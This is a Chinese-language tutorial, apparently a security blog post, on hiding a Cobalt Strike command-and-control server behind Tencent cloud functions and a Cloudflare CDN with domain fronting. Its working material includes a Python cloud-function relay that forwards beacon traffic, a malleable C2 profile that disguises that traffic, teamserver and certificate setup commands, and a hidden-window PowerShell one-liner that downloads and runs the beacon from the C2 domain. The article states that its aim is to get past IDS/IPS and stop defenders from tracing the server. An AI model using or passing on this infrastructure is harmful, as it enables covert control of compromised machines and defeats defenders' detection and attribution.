Cobalt
Strike（以下简称CS）是一款框架式渗透工具，可模拟APT在攻防对抗中进行内网渗透。同时它还集成了端口转发、扫描多模式端口Listener、Windows
exe程序生成、Windows
dll动态链接库生成、java程序生成、office宏代码生成、甚至包括站点克隆获取浏览器信息等。作为网络安全领域的神器，目前CS的通信流量已经能被成熟的IDS、IPS识别检测，一旦被防守人员发现CS的流量或溯源到CS的服务端的IP地址，渗透入侵可能会因此功亏一篑。所以我们需要加密流量保护CS服务器以免被防守方的安全监控检测出来甚至溯源我们的CS服务器，目前常用的隐藏手段包括域前置、CDN、云函数等，接下来我将介绍这几种常见隐藏C2的方式。

## 0x01 云函数

### 云函数介绍

云函数（Serverless Cloud
Function，SCF）主要是为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码。开发者只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在云基础设施上弹性、安全地运行代码。

利用云函数我们可以很好地隐藏自己，主要是因为云函数采用多地部署模式，每次请求都会切换不同的IP地址，虽然默认访问域名还是会被防守方获取到，但是一般情况下防守方无法根据API直接从腾讯云获取我们的个人信息。因此我们可以通过云函数的特性来隐藏CS服务端。

### 创建云函数

在某云上创建自定义云函数同时设置函数名称，具体设置如下：  
![截屏2021-12-23
上午2.33.08](https://image.3001.net/images/20220422/1650618544_626270b00e32eda044997.png!small)

在其中写入云函数的服务端脚本

    
    
    # coding: utf8
    import json,requests,base64
    def main_handler(event, context):
        response = {}
        path = None
        headers = None
        try:
            # 根据自己云服务器的地址修改
            C2='http://x.x.x.x:80'
            if 'path' in event.keys():
                path=event['path']
            if 'headers' in event.keys():
                headers=event['headers']
            if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
                resp=requests.get(C2+path,headers=headers,verify=False) 
            else:
                resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
                print(resp.headers)
                print(resp.content)
            response={
                "isBase64Encoded": True,
                "statusCode": resp.status_code,
                "headers": dict(resp.headers),
                "body": str(base64.b64encode(resp.content))[2:-1]
            }
        except Exception as e:
            print('error')
            print(e)
        finally:
            return response
    

![截屏2021-12-23
上午3.00.27](https://image.3001.net/images/20220422/1650618545_626270b14a4b6c945da0c.png!small)

配置触发器选择`api 网关触发`，其他设置如下：  
![截屏2021-12-23
上午3.02.22](https://image.3001.net/images/20220422/1650618546_626270b2906d51fd252d0.png!small)

编辑 API 并修改路径为`/`，修改完成后发布服务  
![截屏2021-12-23
上午3.06.42](https://image.3001.net/images/20220422/1650618547_626270b3d17bb781a3583.png!small)

### C2服务端测试

在 CS 服务器定制 malleable C2 以用于隐藏流量。malleable C2 主要通过修改 C2 配置文件、更改 beacon 的
payload 的属性和行为来伪造正常的通信流量。

    
    
    set sample_name "func";
    set sleeptime "3000";
    set jitter    "0";
    set maxdns    "255";
    set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";
    
    http-get {
    
        set uri "/api/x";
    
        client {
            header "Accept" "*/*";
            metadata {
                base64;
                prepend "SESSIONID=";
                header "Cookie";
            }
        }
    
        server {
            header "Content-Type" "application/ocsp-response";
            header "content-transfer-encoding" "binary";
            header "Server" "Nodejs";
            output {
                base64;
                print;
            }
        }
    }
    http-stager {
        set uri_x86 "/vue.min.js";
        set uri_x64 "/bootstrap-2.min.js";
    }
    http-post {
        set uri "/api/y";
        client {
            header "Accept" "*/*";
            id {
                base64;
                prepend "JSESSION=";
                header "Cookie";
            }
            output {
                base64;
                print;
            }
        }
    
        server {
            header "Content-Type" "application/ocsp-response";
            header "content-transfer-encoding" "binary";
            header "Connection" "keep-alive";
            output {
                base64;
                print;
            }
        }
    }
    

创建完后将其命名为`api.profile`并通过 teamserver 启动服务端。

    
    
    ./teamserver x.x.x.x xxx api.profile
    

### C2上线

在云函数服务中我们可以找到默认的API访问地址，需要注意该地址是云函数利用的关键。  
![截屏2021-12-23
上午3.08.53](https://image.3001.net/images/20220422/1650618549_626270b55485085d92da1.png!small)

在CS客户端创建监听器`cs_hidden`，将返回地址设置为默认API访问地址`service-xxxx-xxx.xx.xx.tencentcs.com`  
![截屏2021-12-23
上午3.11.21](https://image.3001.net/images/20220422/1650618550_626270b6b90f61ede4e2e.png!small)

生成相应木马并设置监听器为刚创建的`cs_hidden`。  
![截屏2021-12-23
上午3.15.09](https://image.3001.net/images/20220422/1650618552_626270b8f127c28be997e.png!small)

执行后可成功上线 CS，如果外网地址在不断变化，那么就说明云函数利用成功。  
![截屏2021-12-23
上午3.18.27](https://image.3001.net/images/20220422/1650618554_626270ba4cc47c35f7f5d.png!small)

在云函数的日志中我们可以追查到请求已调用成功。  
![截屏2021-12-23
上午3.18.42](https://image.3001.net/images/20220422/1650618555_626270bbd5c974084e420.png!small)

尝试将木马放入微步云沙箱进行检测。可以发现我们的CS上又出现一台主机。  
![截屏2021-12-23
上午3.24.14](https://image.3001.net/images/20220422/1650618557_626270bd38b4fd3cab8b8.png!small)

在微步云沙箱中可以清晰地看到请求域名为腾讯云域名同时IP地址为腾讯云的IDC服务器，而不是我们真正的CS服务器IP地址，说明CS服务器已成功隐藏。  
![截屏2021-12-23
上午3.26.03](https://image.3001.net/images/20220422/1650618558_626270be3d61ae03adee1.png!small)  
![截屏2021-12-23
上午3.39.41](https://image.3001.net/images/20220422/1650618559_626270bf472db008d77cc.png!small)

## 0x02 CDN、域前置

### 域前置介绍

域前置（domain Fronting）是一种基于 https 的通用规避技术，也被称为域前端网络技术，这是一种用来隐藏 Metasploit、Cobalt
Strike等团队控制服务器流量，从而一定程度上绕过检查或防火墙检测技术，一般像 Amazon、Google、Akamai
等大型厂商都会提供域前端技术服务。

与云函数类似，域前置技术主要通过CDN节点将流量转发给真实的C2服务器，CDN节点ip可通过识别请求的Host头进行流量转发，利用我们配置域名的高可信度，那么就可以有效躲避针对DLP、agent等流量监测。

### CDN介绍

域前置核心就是CDN，它的工作原理就是单一IP可被不同域名进行绑定以用于网站加速。例如现在存在 www.a.com 和 www.b.com
这两个域名，它们都同时指向同一个IP，该IP实际上就是 CDN
服务器。那么当我们使用浏览器访问这两个域名时，怎么保证访问的目标就是指定的网站内容呢？我们可以在 http 请求包中的 Host
请求头中加入需要访问的域名，从而定位需要访问的网站。

如果还不明白我们可以使用实际案例进行演示，其中假设`1.1.1.1`为 CDN
服务器，`www.a.com`和`www.b.com`为该服务器上的域名，这两个域名都绑定了CDN 加速。

首先使用 curl 命令请求`www.a.com`，成功返回目标站点的信息

    
    
    curl www.a.com -v
    

![截屏2022-04-12
04.49.45](https://image.3001.net/images/20220422/1650618560_626270c0429ef6f7f714c.png!small)

那么接下来尝试请求CDN服务器会发生什么呢？结果返回403。

    
    
    curl 1.1.1.1 -v
    

![截屏2022-04-12
04.53.15](https://image.3001.net/images/20220422/1650618561_626270c1cc93089abc7f6.png!small)

但我们只需要添加上 Host 头就能访问`www.a.com`的内容。

    
    
    curl 1.1.1.1 -H "Host: www.a.com" -v
    

![截屏2022-04-12
04.53.49](https://image.3001.net/images/20220422/1650618563_626270c35019dbba1c59d.png!small)

### 环境搭建

搭建环境我们可以进行如下配置，这一套整下来大概花费了6美金

  * 云服务器

  * Cobalt Strike 4.3

  * Cloudfare CDN加速

  * 域名

 **域名购买地址：https://porkbun.com**

 **云服务器购买地址：https://my.vultr.com**

 **CDN注册地址：https://www.cloudfare.com**

#### 购买服务器

在`vultr`中注册一个账号，注册完成后我选择 PayPal 绑定，大概需要一天时间来对我的账号进行验证，当然如果没有 PayPal 的话也可以使用
AliPay、信用卡进行绑定。  
![截屏2022-04-19
03.42.28](https://image.3001.net/images/20220422/1650618564_626270c4cdd2e87a7a0b1.png!small)

绑定完成后新账号会送150美金，选择自己喜爱的配置部署云服务器，部署成功的IP地址为2.2.2.2  
![截屏2022-04-19
11.24.25](https://image.3001.net/images/20220422/1650618566_626270c62cc460a44e55e.png!small)

#### 购买域名

在 porkbun 中注册账号，成功购买我们的新域名`xxx.xyz`。  
![截屏2022-04-19
02.59.14](https://image.3001.net/images/20220422/1650618567_626270c7a346c03138746.png!small)

#### 配置CDN

在 Cloudflare 中绑定以上购买的域名，结果显示我们需要修改该域名的DNS记录。  
![截屏2022-04-19
03.02.52](https://image.3001.net/images/20220422/1650618568_626270c8d9507e3a3cd3b.png!small)

修改域名解析服务器如下：

    
    
    jake.ns.cloudflare.com
    magdalena.ns.cloudflare.com
    

![截屏2022-04-19
03.04.18](https://image.3001.net/images/20220422/1650618570_626270ca78a59c1174bf9.png!small)

修改完成后等待 Cloudflare 重新匹配，直至出现如下界面说明 CDN 部署成功  
![截屏2022-04-19
03.39.33](https://image.3001.net/images/20220422/1650618572_626270cc48930a60f5c6c.png!small)

添加 DNS 解析记录如下，与此同时我们还

    
    
    A c2 2.2.2.2
    A xxx.xyz 2.2.2.2
    

![截屏2022-04-19
11.19.15](https://image.3001.net/images/20220422/1650618573_626270cda69a6067aaaf9.png!small)

测试CDN节点是否能够已经解析，成功解析则说明目前一切顺利

    
    
    curl 172.67.175.223 -H "Host: xxx.xyz" -v
    

![截屏2022-04-19
11.29.56](https://image.3001.net/images/20220422/1650618868_626271f4a3fcea90a3866.png!small)

在 Cloudflare 中开启 SSL 并设置SSL/TLS加密模式为完全  
![截屏2022-04-19
04.26.47](https://image.3001.net/images/20220422/1650618576_626270d0469dc5a0a6d67.png!small)

创建SSL/TLS证书，具体配置如下  
![截屏2022-04-20
11.32.25](https://image.3001.net/images/20220422/1650618577_626270d1c270144629789.png!small)

点击创建后可成功生成对应的源证书和私钥  
![截屏2022-04-20
15.27.26](https://image.3001.net/images/20220422/1650618579_626270d34d5810cc2d74f.png!small)

### C2服务端测试

在云服务器上定制 malleable C2 以用于配置证书，使用 openssl
利用CDN的SSL/TLS源证书和私钥生成PFX文件`spoofdomain.p12`

    
    
    openssl pkcs12 -export -in cloudflare.pem -inkey cloudflare.key -out spoofdomain.p12 -name c2.maccc.xyz -passout pass:macmacmac
    

Keytool是一个Java数据证书的管理工具，使用它将以上密钥和证书生成的PFX文件存在keystore文件`new.store`当中

    
    
    keytool -importkeystore -deststorepass macmacmac -destkeypass macmacmac -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass macmacmac -alias c2.xxx.xyz
    

![截屏2022-04-20
16.38.13](https://image.3001.net/images/20220422/1650618580_626270d4e437aa4eb8b4d.png!small)

**工具下载地址：https://github.com/FortyNorthSecurity/C2concealer**

C2concealer 是一款随机生成 CS 使用的C2 malleable profiles的命令行工具，如果未安装可使用如下命令进行安装

    
    
    chmod u+x install.sh
    ./install.sh
    

![截屏2022-04-20
16.46.02](https://image.3001.net/images/20220422/1650618582_626270d616f10c9dec348.png!small)

使用 C2concealer 生成 CS 的配置文件

    
    
    C2concealer --variant 1 --hostname c2.xxx.xyz
    # 选择步骤
    1.3
    2./root/CS4.3/new.store
    3.输入账号密码
    

![截屏2022-04-20
16.49.25](https://image.3001.net/images/20220422/1650618583_626270d73d25b03550673.png!small)

成功生成文件名为随机数 CS 配置文件，将其复制到 CS 目录下并重命名为`test.profile`

    
    
    cp 56069b6a.profile /root/CS4.3/test.profile
    cd /root/CS4.3/
    ls
    

![截屏2022-04-20
16.51.58](https://image.3001.net/images/20220422/1650618584_626270d84d7f17ace1615.png!small)

使用 c2lint 检查该配置文件

    
    
    chmod +x c2lint
    ./c2lint test.profile
    

![截屏2022-04-20
16.53.33](https://image.3001.net/images/20220422/1650618585_626270d93dc93689178ba.png!small)

修改 teamserver 配置，当然最好把我们 CS 的默认端口50050也修改成其他端口

    
    
    vim teamserver
    # 配置修改
    javax.net.ssl.keyStore=./new.store
    -Djavax.net.ssl.keyStorePassword=macmacmac
    

![截屏2022-04-20
17.49.49](https://image.3001.net/images/20220422/1650618586_626270da903022d4220a3.png!small)

启动 teamserver 并加载配置文件`test.profile`

    
    
    ./teamserver 2.2.2.2 macmacmac test.profile
    

### C2上线

在 CS 客户端生成 https 监听器  
![截屏2022-04-21
00.20.41](https://image.3001.net/images/20220422/1650618587_626270dba88592598d0b4.png!small)

配置拥有 SSL 的 web 服务，选择 payload 类型为 powershell  
![截屏2022-04-21
00.26.44](https://image.3001.net/images/20220422/1650618589_626270dd6a9a270387d7d.png!small)

成功生成 powershell 版本的 payload

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://c2.xxx.xyz:443/test'))"
    

在靶机中执行后可成功上线，与此同时我们可以发现外部地址随着每次请求一直变化，因此防守方溯源到我们C2服务器的IP地址几率也就非常低  
![截屏2022-04-21
00.32.06](https://image.3001.net/images/20220422/1650618591_626270df0036bc9e7838e.png!small)

在 CS 中成功执行命令并在受害主机上开启 WireShark 抓包  
![截屏2022-04-21
00.47.26](https://image.3001.net/images/20220422/1650618591_626270dff41f9933ddbab.png!small)

在 WireShark 中跑的都是TLS加密流量、目的地址为随机的CDN节点，因此无法溯源到我们C2服务器的真实IP  
![截屏2022-04-21
00.48.32](https://image.3001.net/images/20220422/1650618593_626270e1210e762f1b73f.png!small)

## 0x03 总结

通过这段时间针对流量加密的学习，我发现网络攻击与防守总是在不断转换，就像CDN在设计之初主要用于保护网站的真实IP，但作为攻击者我们也可以使用它来保护我们的C2服务器；使用OpenSSL生成的RSA证书能够有效地帮助我们加密流量、隐藏通信。因此技术不分好坏，决定好坏的往往在于使用它的人。

>  **参考文章1：https://blog.csdn.net/weixin_44604541/article/details/118413649**
>
>  **参考文章2：https://www.anquanke.com/post/id/243146**

